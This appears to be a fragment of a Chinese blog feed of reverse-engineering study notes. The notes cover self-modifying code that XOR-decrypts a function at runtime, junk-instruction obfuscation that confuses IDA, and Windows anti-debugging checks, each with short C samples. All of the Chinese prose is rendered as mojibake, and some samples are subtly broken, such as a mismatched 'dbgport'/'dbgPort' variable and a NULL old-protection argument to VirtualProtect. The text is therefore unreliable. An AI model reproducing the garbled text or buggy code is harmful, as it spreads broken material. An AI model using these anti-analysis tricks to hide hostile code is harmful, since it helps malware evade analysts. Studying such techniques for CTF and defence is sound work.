class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿è¡Œæ—¶è§£å¯† check å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">()</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(check, <span class="number">4096</span>, PAGE_EXECUTE_READWRITE, &amp;old); <span class="comment">// ä¿®æ”¹å†…å­˜é¡µæƒé™</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">char</span>*)check + i) ^= <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line">VirtualProtect(check, <span class="number">4096</span>, old, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">decrypt(); <span class="comment">// æ–°å¢</span></span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘åï¼Œåœ¨ 16 è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ‰¾åˆ°å¹¶ä¿®æ”¹ check å‡½æ•°çš„æœºå™¨ç ä¸ºåŠ å¯†åçš„æ•°æ®</p><p>ä¸€ä¸ªå…·å¤‡ SMC å±æ€§çš„å¯æ‰§è¡Œæ–‡ä»¶å·²ç»æ„é€ å®Œæˆäº†ï¼Œç°åœ¨å†ç”¨ IDA è¿›è¡Œåˆ†æï¼š</p><p>å‘ç°åŸå§‹é€»è¾‘å·²ç»è¢«å¾ˆå¥½åœ°éšè—äº†ã€‚</p><p>å¦ä¸€ç§å¸¸è§çš„å®ç°æ–¹æ³•æ˜¯é€šè¿‡æ–°å¢ä¸€ä¸ªå…·å¤‡ RWX å±æ€§çš„ç¨‹åºæ®µï¼Œå°†éœ€è¦ä¿æŠ¤çš„ä»£ç ä¹¦å†™åœ¨å…¶ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…è°ƒç”¨ VirtualAlloc &#x2F; VirtualProtect &#x2F; mprotect è¿™ç±» API æ¥æš´éœ² SMC çš„æ„å›¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.qaq&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:.qaq,ERW&quot;</span>)</span></span><br><span class="line"><span class="comment">// è¿è¡Œæ—¶è§£å¯† check å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">*((<span class="type">char</span>*)check + i) ^= <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">decrypt();</span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ IDA ä¸­çœ‹åˆ°æ–°å¢äº†ä¸€ä¸ªæ®µï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240122235013392.png" alt="image-20240122235013392"></p><h2 id="å¯¹æŠ—æ€è·¯"><a href="#å¯¹æŠ—æ€è·¯" class="headerlink" title="å¯¹æŠ—æ€è·¯"></a>å¯¹æŠ—æ€è·¯</h2><p>èƒ½åŠ¨æ€è°ƒè¯•æœ€å¥½ç›´æ¥åŠ¨æ€è°ƒè¯•ï¼Œå› ä¸ºåœ¨ç¨‹åºè¿è¡Œçš„æŸä¸€æ—¶åˆ»ï¼Œå®ƒä¸€å®šæ˜¯è§£å¯†å®Œæˆçš„ï¼Œè¿™æ—¶ä¹Ÿå°±æš´éœ²äº†ï¼Œä½¿ç”¨<strong>åŠ¨æ€åˆ†æè¿è¡Œåˆ°è¿™ä¸€æ—¶åˆ»å³å¯è¿‡æ‰ä¿æŠ¤</strong>ã€‚</p><p>å…¶æ¬¡æ˜¯æ ¹æ®é™æ€åˆ†æè·å¾—è§£å¯†ç®—æ³•ï¼Œå†™å‡ºè§£å¯†è„šæœ¬æå‰è§£å¯†è¿™æ®µä»£ç ã€‚</p><p>è§£å¯†å¾—åˆ°çš„æœºå™¨ç å¯ä»¥é€šè¿‡ IDAPython çš„ patch_byte æ¥å£å¾ˆæ–¹ä¾¿åœ°å†™å›ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PEæ–‡ä»¶ç»“æ„&amp;#x2F;&amp;#x2F;&lt;/p&gt;
&lt;h1 id=&quot;è‡ªä¿®æ”¹ä»£ç &quot;&gt;&lt;a href=&quot;#è‡ªä¿®æ”¹ä»£ç &quot; class=&quot;headerlink&quot; title=&quot;è‡ªä¿®æ”¹ä»£ç &quot;&gt;&lt;/a&gt;è‡ªä¿®æ”¹ä»£ç &lt;/h1&gt;&lt;p&gt;Self-Modifying Code&lt;/p&gt;
&lt;p&gt;è‡ªä¿®æ”¹ä»£ç </summary>
      
    
    
    
    
    <category term="é€†å‘ å­ä¿®æ”¹ä»£ç " scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91-%E5%AD%90%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>èŠ±æŒ‡ä»¤&amp;åè°ƒè¯•</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/19/20240117_%E8%8A%B1%E6%8C%87%E4%BB%A4&amp;%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/19/20240117_%E8%8A%B1%E6%8C%87%E4%BB%A4&amp;%E5%8F%8D%E8%B0%83%E8%AF%95/</id>
    <published>2024-01-18T16:00:00.000Z</published>
    <updated>2024-01-22T17:09:44.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="èŠ±æŒ‡ä»¤-amp-åè°ƒè¯•"><a href="#èŠ±æŒ‡ä»¤-amp-åè°ƒè¯•" class="headerlink" title="èŠ±æŒ‡ä»¤&amp;åè°ƒè¯•"></a>èŠ±æŒ‡ä»¤&amp;åè°ƒè¯•</h1><p>2024&#x2F;01&#x2F;17</p><p>å¥½ï¼Œåšé“upxç»ƒæ‰‹ï¼ŒæŠŠsublimeæå´©äº†ã€‚åæ¥æ‰çŸ¥é“æ˜¯æ–‡ä»¶æ²¡æœ‰ä¿å­˜ç”¨ä¸äº†ã€‚<br>ç°åœ¨è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ–‡ä»¶gitä¸ä¸Šå»ã€‚ã€‚ã€‚å¬å¤©ç”±å‘½å§</p><p>2024&#x2F;01&#x2F;18</p><p>gitä¸Šå»äº†ï¼</p><p>æ–¹æ³•ï¼šæ›´æ”¹äº†C:\Windows\System32\drivers\etcçš„hostsï¼ŒåŠ äº†IPè¡¨ï¼Œå¥½ç”¨ï¼ï¼ˆå‘œå‘œå‘œï¼‰</p><p>2024&#x2F;01&#x2F;19</p><p>å¬ä¼¯å°¼å­¦é•¿è¯´ï¼Œä¿®æ”¹ç³»ç»Ÿé…ç½®çš„http_proxyå’Œhttps_proxyä¸ºæ¢¯å­çš„ipï¼Œè¿™æ ·å°±å¯ä»¥åœ¨pingçš„æ—¶å€™èµ°æ¢¯å­äº†</p><p>æˆ–è€…ç›´æ¥åœ¨cmdé‡Œ<code>set http_proxy=http://127.0.0.1:7890 &amp; set https_proxy=http://127.0.0.1:7890</code></p><p>æ¬¸å˜¿ï¼Œæ˜¨å¤©ç©å„¿äº†ä¸€å¤©ï¼Œä»Šå¤©ç»§ç»­å­¦</p><h2 id="èŠ±æŒ‡ä»¤"><a href="#èŠ±æŒ‡ä»¤" class="headerlink" title="èŠ±æŒ‡ä»¤"></a>èŠ±æŒ‡ä»¤</h2><p>è§£æå¤±è´¥ï¼Œä¸€èˆ¬å¯èƒ½æ˜¯èŠ±æŒ‡ä»¤</p><h3 id="ä¼šè¢«æ‰§è¡Œ"><a href="#ä¼šè¢«æ‰§è¡Œ" class="headerlink" title="ä¼šè¢«æ‰§è¡Œ"></a>ä¼šè¢«æ‰§è¡Œ</h3><p>å¹²æ‰°é™æ€åˆ†æ*</p><h4 id="æ”¹å˜å †æ ˆæ“ä½œ"><a href="#æ”¹å˜å †æ ˆæ“ä½œ" class="headerlink" title="æ”¹å˜å †æ ˆæ“ä½œ"></a>æ”¹å˜å †æ ˆæ“ä½œ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">push eax;</span><br><span class="line">add esp, <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨callæŒ‡ä»¤æˆ–jmpæŒ‡ä»¤å¢åŠ æ‰§è¡Œæµç¨‹å¤æ‚åº¦"><a href="#åˆ©ç”¨callæŒ‡ä»¤æˆ–jmpæŒ‡ä»¤å¢åŠ æ‰§è¡Œæµç¨‹å¤æ‚åº¦" class="headerlink" title="åˆ©ç”¨callæŒ‡ä»¤æˆ–jmpæŒ‡ä»¤å¢åŠ æ‰§è¡Œæµç¨‹å¤æ‚åº¦"></a>åˆ©ç”¨callæŒ‡ä»¤æˆ–jmpæŒ‡ä»¤å¢åŠ æ‰§è¡Œæµç¨‹å¤æ‚åº¦</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">call xxx</span><br><span class="line">xxx :</span><br><span class="line">add[esp], <span class="number">0x7</span></span><br><span class="line">retn</span><br><span class="line">_emit <span class="number">0x12</span></span><br><span class="line">_emit <span class="number">0x34</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wwwwww&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæœ‰0x12,0x34ï¼Œpushæ²¡è¯†åˆ«å‡ºæ¥ï¼Œprintfåæ²¡æ³•æ‰§è¡Œã€‚</p><p>callâ€“&gt;ç»“æŸ</p><p>æ‰¾åˆ°æ ˆå˜åŒ–çš„åœ°æ–¹ï¼ˆespè½¬å‘ï¼‰æŒ‰Cé‡ç¼–è¯‘</p><h3 id="ä¸ä¼šè¢«æ‰§è¡Œ"><a href="#ä¸ä¼šè¢«æ‰§è¡Œ" class="headerlink" title="ä¸ä¼šè¢«æ‰§è¡Œ"></a>ä¸ä¼šè¢«æ‰§è¡Œ</h3><h4 id="æ’å…¥æœºå™¨ç "><a href="#æ’å…¥æœºå™¨ç " class="headerlink" title="æ’å…¥æœºå™¨ç "></a>æ’å…¥æœºå™¨ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="keyword">xor</span> eax, eax;</span><br><span class="line">jz xxx;</span><br><span class="line">_emit <span class="number">0x11</span>;</span><br><span class="line">_emit <span class="number">0x22</span>;</span><br><span class="line">_emit <span class="number">0x33</span>; <span class="comment">// 0x33æ˜¯ xor æŒ‡ä»¤çš„æ“ä½œç ï¼Œä¼šå¯¼è‡´åé¢æ­£å¸¸çš„ push æŒ‡ä»¤è¢«é”™è¯¯è§£æ</span></span><br><span class="line">xxx:</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ”¹å˜å †æ ˆå¹³è¡¡"><a href="#æ”¹å˜å †æ ˆå¹³è¡¡" class="headerlink" title="æ”¹å˜å †æ ˆå¹³è¡¡"></a>æ”¹å˜å †æ ˆå¹³è¡¡</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        <span class="keyword">xor</span> eax,eax;</span><br><span class="line">        jz s;</span><br><span class="line">        add esp,<span class="number">0x11</span>;</span><br><span class="line">    s:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDAåç¼–è¯‘æŠ¥é”™ï¼Œå¥½åƒå¯ä»¥F5é‡ç¼–è¯‘ã€‚ã€‚ã€‚æˆ–è€…å‘ç°èŠ±æŒ‡ä»¤åœ°æ–¹nopï¼</p><p>xor eaxï¼Œeaxåæœ‰jzå‘½ä»¤åæœ‰ä¸€ä¸ª+1</p><h2 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h2><p>æ£€æµ‹è°ƒè¯•çš„é™·é˜±w~</p><h3 id="å‡½æ•°æ£€æµ‹ï¼š"><a href="#å‡½æ•°æ£€æµ‹ï¼š" class="headerlink" title="å‡½æ•°æ£€æµ‹ï¼š"></a>å‡½æ•°æ£€æµ‹ï¼š</h3><p>å‡½æ•°æ£€æµ‹å°±æ˜¯é€šè¿‡ Windows è‡ªå¸¦çš„å…¬å¼€æˆ–æœªå…¬å¼€çš„å‡½æ•°ç›´æ¥æ£€æµ‹ç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ã€‚</p><h4 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a><strong>IsDebuggerPresent</strong></h4><p>æœ€ç®€å•çš„è°ƒè¯•å™¨æ£€æµ‹å‡½æ•°æ˜¯ IsDebuggerPresent() ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">IsDebuggerPresent</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æŸ¥è¯¢è¿›ç¨‹ç¯å¢ƒå—ï¼ˆPEBï¼‰ä¸­çš„ BeingDebugged æ ‡å¿—ï¼Œå¦‚æœè¿›ç¨‹å¤„åœ¨è°ƒè¯•ä¸Šä¸‹æ–‡ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œå¦åˆ™è¿”å›é›¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> IsDebuggerPresent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a><strong>CheckRemoteDebuggerPresent</strong></h4><p>CheckRemoteDebuggerPresent() ç”¨äºæ£€æµ‹ä¸€ä¸ªè¿œç¨‹è¿›ç¨‹æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">CheckRemoteDebuggerPresent</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HANDLE hProcess,</span></span><br><span class="line"><span class="params">_Inout_ PBOOL pbDebuggerPresent</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœ hProcess å¥æŸ„è¡¨ç¤ºçš„è¿›ç¨‹å¤„äºè°ƒè¯•ä¸Šä¸‹æ–‡ï¼Œåˆ™è®¾ç½® pbDebuggerPresent å˜é‡è¢«è®¾ç½®ä¸ºTRUE ï¼Œå¦åˆ™è¢«è®¾ç½®ä¸º FALSE ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">BOOL ret;</span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a><strong>NtQueryInformationProcess</strong></h4><p>NtQueryInformationProcess ç”¨äºè·å–ç»™å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI <span class="title function_">NtQueryInformationProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">_In_ PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="line"><span class="params">_Out_ PVOID ProcessInformation,</span></span><br><span class="line"><span class="params">_In_ ULONG ProcessInformationLength,</span></span><br><span class="line"><span class="params">_Out_opt_ PULONG ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå‚æ•° ProcessInformationClass ç»™å®šäº†éœ€è¦æŸ¥è¯¢çš„è¿›ç¨‹ä¿¡æ¯ç±»å‹ã€‚å½“ç»™å®šå€¼ä¸º0 ï¼ˆ ProcessBasicInformation ï¼‰æˆ– 7 ï¼ˆProcessDebugPort ï¼‰æ—¶ï¼Œå°±èƒ½å¾—åˆ°ç›¸å…³è°ƒè¯•ä¿¡æ¯ï¼Œè¿”å›ä¿¡æ¯ä¼šå†™åˆ°ç¬¬ä¸‰ä¸ªå‚æ•° ProcessInformation æŒ‡å‘çš„ç¼“å†²åŒºä¸­ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dbgport = <span class="number">0</span>;</span><br><span class="line">HMODULE hModule = LoadLibrary(<span class="string">&quot;Ntdll.dll&quot;</span>);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess =(NtQueryInformationProcessPtr)GetProcAddress(hModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), <span class="number">7</span>, &amp;dbgPort,<span class="keyword">sizeof</span>(dbgPort),<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> dbgPort != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a><strong>GetLastError</strong></h4><p>ç¼–å†™åº”ç”¨ç¨‹åºæ—¶ï¼Œç»å¸¸éœ€è¦æ¶‰åŠåˆ°é”™è¯¯å¤„ç†é—®é¢˜ã€‚è®¸å¤šå‡½æ•°è°ƒç”¨åªç”¨ TRUE å’Œ FALSE æ¥è¡¨æ˜å‡½æ•°çš„è¿è¡Œç»“æœã€‚ä¸€æ—¦å‡ºç°é”™è¯¯ï¼ŒMSDN ä¸­å¾€å¾€ä¼šæŒ‡å‡ºè¯·ç”¨ GetLastError å‡½æ•°æ¥è·å¾—é”™è¯¯åŸå› ã€‚</p><p>æ¶æ„ä»£ç å¯ä»¥ä½¿ç”¨å¼‚å¸¸æ¥ç ´åæˆ–è€…æ¢æµ‹è°ƒè¯•å™¨ã€‚è°ƒè¯•å™¨æ•è·å¼‚å¸¸åï¼Œå¹¶ä¸ä¼šç«‹å³å°†å¤„ç†æƒè¿”å›è¢«è°ƒè¯•è¿›ç¨‹å¤„ç†ï¼Œå¤§å¤šæ•°åˆ©ç”¨å¼‚å¸¸çš„åè°ƒè¯•æŠ€æœ¯å¾€å¾€æ®æ­¤æ¥æ£€æµ‹è°ƒè¯•å™¨ã€‚</p><p>å¤šæ•°è°ƒè¯•å™¨é»˜è®¤çš„è®¾ç½®æ˜¯æ•è·å¼‚å¸¸åä¸å°†å¼‚å¸¸ä¼ é€’ç»™åº”ç”¨ç¨‹åºã€‚å¦‚æœè°ƒè¯•å™¨ä¸èƒ½å°†å¼‚å¸¸ç»“æœæ­£ç¡®è¿”å›åˆ°è¢«è°ƒè¯•è¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ç§å¼‚å¸¸å¤±æ•ˆå¯ä»¥è¢«è¿›ç¨‹å†…éƒ¨çš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ¢æµ‹ã€‚</p><p>å¯¹äº OutputDebugString å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨è°ƒè¯•å™¨ä¸­æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ä»¥ç”¨æ¥æ¢æµ‹è°ƒè¯•å™¨çš„å­˜åœ¨ã€‚ä½¿ç”¨ SetLastError å‡½æ•°ï¼Œå°†å½“å‰çš„é”™è¯¯ç è®¾ç½®ä¸ºä¸€ä¸ªä»»æ„å€¼ã€‚</p><p>å¦‚æœè¿›ç¨‹æ²¡æœ‰è¢«è°ƒè¯•å™¨é™„åŠ ï¼Œè°ƒç”¨ OutputDebugString å‡½æ•°ä¼šå¤±è´¥ï¼Œé”™è¯¯ç ä¼šé‡æ–°è®¾ç½®ï¼Œå› æ­¤GetLastError è·å–çš„é”™è¯¯ç åº”è¯¥ä¸æ˜¯æˆ‘ä»¬è®¾ç½®çš„ä»»æ„å€¼ã€‚</p><p>ä½†å¦‚æœè¿›ç¨‹è¢«è°ƒè¯•å™¨é™„åŠ ï¼Œè°ƒç”¨ OutputDebugString å‡½æ•°ä¼šæˆåŠŸï¼Œè¿™æ—¶ GetLastError è·å–çš„é”™è¯¯ç åº”è¯¥æ²¡æ”¹å˜ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD errorValue = <span class="number">12345</span>;</span><br><span class="line"><span class="built_in">SetLastError</span>(errorValue);</span><br><span class="line"><span class="built_in">OutputDebugStringA</span>(<span class="string">&quot;Test for debugger!&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == errorValue)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äº DeleteFiber å‡½æ•°ï¼Œå¦‚æœç»™å®ƒä¼ é€’ä¸€ä¸ªæ— æ•ˆçš„å‚æ•°çš„è¯ä¼šæŠ›å‡ºERROR_INVALID_PARAMETER å¼‚å¸¸ã€‚å¦‚æœè¿›ç¨‹æ­£åœ¨è¢«è°ƒè¯•çš„è¯ï¼Œå¼‚å¸¸ä¼šè¢«è°ƒè¯•å™¨æ•è·ã€‚æ‰€ä»¥ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡éªŒè¯ LastError å€¼æ¥æ£€æµ‹è°ƒè¯•å™¨çš„å­˜åœ¨ã€‚å¦‚ä»£ç æ‰€ç¤ºï¼Œ0x57 å°±æ˜¯æŒ‡ ERROR_INVALID_PARAMETER ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> fib[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">DeleteFiber</span>(fib);</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">GetLastError</span>() != <span class="number">0x57</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·è¿˜å¯ä»¥ä½¿ç”¨ CloseHandle ã€ CloseWindow äº§ç”Ÿå¼‚å¸¸ï¼Œä½¿å¾—é”™è¯¯ç æ”¹å˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 